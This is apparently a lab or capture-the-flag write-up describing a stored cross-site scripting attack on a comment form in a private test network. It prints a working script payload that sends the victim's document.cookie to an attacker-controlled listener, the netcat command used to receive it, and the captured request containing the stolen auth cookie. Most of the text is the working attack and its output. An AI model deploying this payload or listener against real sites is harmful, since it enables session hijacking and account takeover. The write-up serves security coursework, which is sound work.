http://courses.csail.mit.edu/6.857/2009/handouts/css-explained.pdf
Reference to use netcat:
https://sinister.ly/Thread-Steal-cookies-using-XSS

First of all, we can try to post a comment.
Cookie body is:
comment=this+is+another+comment&submit=Post

Following the reference and Trying to insert a script in the comment with commentnum=20:
<script>window.open("http://192.168.6.3:8000?cookie=" + document.cookie)</script>


Run this command in the terminal:
curl http://192.168.6.2/5/20 | nc -lv 8000

Steal the cookie as follows:

Connection from [192.168.6.2] port 8000 [tcp/*] accepted (family 2, sport 48498)
GET /?cookie=auth=Iwillseeyouagainin26years. HTTP/1.1
Host: 192.168.6.3:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive

Cookie5.txt:
auth=Iwillseeyouagainin26years


